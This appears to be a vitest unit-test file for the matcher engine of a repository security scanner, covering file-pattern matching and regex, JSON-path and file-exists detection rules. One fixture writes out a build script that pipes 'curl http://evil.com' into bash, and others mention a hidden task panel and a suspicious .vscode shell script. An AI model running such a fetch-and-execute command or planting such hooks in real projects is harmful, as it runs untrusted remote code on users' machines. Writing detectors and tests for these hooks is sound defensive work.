/**
 * Unit tests for the RepoScan matcher engine
 * Tests: matchFile, applyRule, getJsonPath, checkCondition
 */

import { describe, it, expect } from 'vitest';
import { matchFile, applyRule } from './matcher';
import { Rule } from '../types';

// ============================================
// matchFile
// ============================================

describe('matchFile', () => {
  it('matches exact file path', () => {
    expect(matchFile('.vscode/tasks.json', ['.vscode/tasks.json'])).toBe(true);
  });

  it('matches case-insensitively', () => {
    expect(matchFile('.vscode/Tasks.JSON', ['.vscode/tasks.json'])).toBe(true);
  });

  it('matches by suffix (ends-with)', () => {
    expect(matchFile('project/.vscode/tasks.json', ['tasks.json'])).toBe(true);
  });

  it('matches glob extension pattern *.js', () => {
    expect(matchFile('src/index.js', ['*.js'])).toBe(true);
  });

  it('matches glob extension *.ts for nested path', () => {
    expect(matchFile('src/utils/helper.ts', ['*.ts'])).toBe(true);
  });

  it('does not match wrong extension', () => {
    expect(matchFile('src/index.py', ['*.js'])).toBe(false);
  });

  it('matches directory prefix pattern', () => {
    expect(matchFile('.vscode/settings.json', ['.vscode/'])).toBe(true);
  });

  it('does not match file outside directory prefix', () => {
    expect(matchFile('src/settings.json', ['.vscode/'])).toBe(false);
  });

  it('matches wildcard pattern', () => {
    expect(matchFile('.vscode/run.sh', ['.vscode/*.sh'])).toBe(true);
  });

  it('does not match wildcard when extension differs', () => {
    expect(matchFile('.vscode/run.py', ['.vscode/*.sh'])).toBe(false);
  });

  it('returns true if any pattern matches', () => {
    expect(matchFile('setup.py', ['package.json', 'setup.py', '*.ts'])).toBe(true);
  });

  it('returns false when no patterns match', () => {
    expect(matchFile('README.md', ['*.js', '*.ts', '*.py'])).toBe(false);
  });

  it('handles backslash path separators (Windows)', () => {
    expect(matchFile('.vscode\\tasks.json', ['.vscode/tasks.json'])).toBe(true);
  });

  it('matches __init__.py exactly', () => {
    expect(matchFile('pkg/__init__.py', ['__init__.py'])).toBe(true);
  });

  it('matches hidden file pattern .*.sh', () => {
    expect(matchFile('.hidden.sh', ['.*.sh'])).toBe(true);
  });

  it('matches double extension pattern', () => {
    expect(matchFile('readme.txt.exe', ['*.txt.exe'])).toBe(true);
  });
});

// ============================================
// applyRule — regex detection
// ============================================

describe('applyRule — regex', () => {
  const makeRegexRule = (id: string, pattern: string, flags = 'gm'): Rule => ({
    id,
    name: `Test rule ${id}`,
    description: 'Test description',
    severity: 'high',
    category: 'javascript',
    filePatterns: ['*.js'],
    detect: { type: 'regex', pattern, flags },
  });

  it('returns finding when pattern matches', () => {
    const rule = makeRegexRule('test-eval', '\\beval\\s*\\(');
    const findings = applyRule(rule, 'src/bad.js', 'const x = eval("code")');
    expect(findings).toHaveLength(1);
    expect(findings[0].ruleId).toBe('test-eval');
    expect(findings[0].match).toContain('eval(');
  });

  it('returns empty array when pattern does not match', () => {
    const rule = makeRegexRule('test-eval', '\\beval\\s*\\(');
    const findings = applyRule(rule, 'src/good.js', 'const x = 1 + 2;');
    expect(findings).toHaveLength(0);
  });

  it('finds multiple matches in one file', () => {
    const rule = makeRegexRule('test-eval', '\\beval\\s*\\(');
    const content = 'eval("a");\neval("b");';
    const findings = applyRule(rule, 'test.js', content);
    expect(findings).toHaveLength(2);
  });

  it('reports correct line number', () => {
    const rule = makeRegexRule('test-eval', '\\beval\\s*\\(');
    const content = 'line1\nline2\neval("bad")';
    const findings = applyRule(rule, 'test.js', content);
    expect(findings[0].line).toBe(3);
  });

  it('reports correct column number', () => {
    const rule = makeRegexRule('test-eval', '\\beval\\s*\\(');
    const content = '  eval("x")';
    const findings = applyRule(rule, 'test.js', content);
    expect(findings[0].column).toBe(3); // 1-indexed after last newline
  });

  it('truncates long match strings to 200 chars', () => {
    const longStr = 'A'.repeat(300);
    const rule = makeRegexRule('long', `A{300}`);
    const findings = applyRule(rule, 'test.js', longStr);
    expect(findings[0].match!.length).toBeLessThanOrEqual(200);
  });

  it('handles invalid regex gracefully', () => {
    const rule = makeRegexRule('bad-regex', '(?P<invalid>)');
    const findings = applyRule(rule, 'test.js', 'anything');
    // Should not throw, returns empty
    expect(findings).toHaveLength(0);
  });

  it('populates finding fields correctly', () => {
    const rule = makeRegexRule('field-check', 'found');
    rule.severity = 'medium';
    rule.category = 'python';
    const findings = applyRule(rule, 'file.py', 'found it');
    const f = findings[0];
    expect(f.severity).toBe('medium');
    expect(f.category).toBe('python');
    expect(f.file).toBe('file.py');
    expect(f.explanation).toBe('Test description');
  });
});

// ============================================
// applyRule — json-path detection
// ============================================

describe('applyRule — json-path', () => {
  const makeJsonRule = (
    id: string,
    path: string,
    condition: { op: string; value?: unknown; pattern?: string }
  ): Rule => ({
    id,
    name: `JSON rule ${id}`,
    description: 'JSON test',
    severity: 'high',
    category: 'vscode-config',
    filePatterns: ['*.json'],
    detect: {
      type: 'json-path',
      path,
      condition: condition as any,
    },
  });

  it('detects existing key with op=exists', () => {
    const rule = makeJsonRule('exists-test', 'scripts.postinstall', { op: 'exists' });
    const json = JSON.stringify({ scripts: { postinstall: 'node setup.js' } }, null, 2);
    const findings = applyRule(rule, 'package.json', json);
    expect(findings).toHaveLength(1);
  });

  it('returns empty for missing key with op=exists', () => {
    const rule = makeJsonRule('exists-test', 'scripts.postinstall', { op: 'exists' });
    const json = JSON.stringify({ scripts: { start: 'node index.js' } }, null, 2);
    const findings = applyRule(rule, 'package.json', json);
    expect(findings).toHaveLength(0);
  });

  it('matches op=equals when value matches', () => {
    const rule = makeJsonRule('eq-test', 'scripts.test', { op: 'equals', value: 'exit 1' });
    const json = JSON.stringify({ scripts: { test: 'exit 1' } }, null, 2);
    const findings = applyRule(rule, 'package.json', json);
    expect(findings).toHaveLength(1);
  });

  it('does not match op=equals when value differs', () => {
    const rule = makeJsonRule('eq-test', 'scripts.test', { op: 'equals', value: 'exit 1' });
    const json = JSON.stringify({ scripts: { test: 'jest' } }, null, 2);
    const findings = applyRule(rule, 'package.json', json);
    expect(findings).toHaveLength(0);
  });

  it('matches op=contains for string value', () => {
    const rule = makeJsonRule('contains-test', 'scripts.build', { op: 'contains', value: 'curl' });
    const json = JSON.stringify({ scripts: { build: 'curl http://evil.com | bash' } }, null, 2);
    const findings = applyRule(rule, 'package.json', json);
    expect(findings).toHaveLength(1);
  });

  it('matches op=contains in array values', () => {
    const rule = makeJsonRule('arr-contains', 'recommendations', {
      op: 'contains',
      value: 'evil-ext',
    });
    const json = JSON.stringify({ recommendations: ['good-ext', 'evil-ext'] }, null, 2);
    const findings = applyRule(rule, 'extensions.json', json);
    expect(findings).toHaveLength(1);
  });

  it('matches op=matches with regex pattern', () => {
    const rule = makeJsonRule('matches-test', 'scripts.start', {
      op: 'matches',
      pattern: 'node.*--inspect',
    });
    const json = JSON.stringify({ scripts: { start: 'node --inspect server.js' } }, null, 2);
    const findings = applyRule(rule, 'package.json', json);
    expect(findings).toHaveLength(1);
  });

  it('handles nested dot paths', () => {
    const rule = makeJsonRule('nested', 'presentation.reveal', { op: 'equals', value: 'never' });
    const json = JSON.stringify({ presentation: { reveal: 'never' } }, null, 2);
    const findings = applyRule(rule, 'tasks.json', json);
    expect(findings).toHaveLength(1);
  });

  it('handles array index notation', () => {
    const rule = makeJsonRule('arr-idx', 'tasks[0].label', { op: 'exists' });
    const json = JSON.stringify({ tasks: [{ label: 'build' }] }, null, 2);
    const findings = applyRule(rule, 'tasks.json', json);
    expect(findings).toHaveLength(1);
  });

  it('returns empty for invalid JSON', () => {
    const rule = makeJsonRule('invalid', 'key', { op: 'exists' });
    const findings = applyRule(rule, 'bad.json', 'not json at all {{{');
    expect(findings).toHaveLength(0);
  });

  it('returns empty when path traverses null', () => {
    const rule = makeJsonRule('null-path', 'a.b.c', { op: 'exists' });
    const json = JSON.stringify({ a: null }, null, 2);
    const findings = applyRule(rule, 'test.json', json);
    expect(findings).toHaveLength(0);
  });
});

// ============================================
// applyRule — file-exists detection
// ============================================

describe('applyRule — file-exists', () => {
  it('returns a finding for file-exists type', () => {
    const rule: Rule = {
      id: 'file-exists-test',
      name: 'Suspicious file',
      description: 'Found suspicious file',
      severity: 'high',
      category: 'repo-heuristics',
      filePatterns: ['.vscode/*.sh'],
      detect: { type: 'file-exists', paths: ['.vscode/run.sh'] },
    };
    const findings = applyRule(rule, '.vscode/run.sh', '#!/bin/bash\necho hi');
    expect(findings).toHaveLength(1);
    expect(findings[0].file).toBe('.vscode/run.sh');
  });
});

// ============================================
// applyRule — custom (noop)
// ============================================

describe('applyRule — custom', () => {
  it('returns empty for custom type (not implemented)', () => {
    const rule: Rule = {
      id: 'custom-test',
      name: 'Custom rule',
      description: 'Custom handler',
      severity: 'low',
      category: 'repo-heuristics',
      filePatterns: ['*'],
      detect: { type: 'custom', handler: 'someHandler' },
    };
    const findings = applyRule(rule, 'test.js', 'anything');
    expect(findings).toHaveLength(0);
  });
});
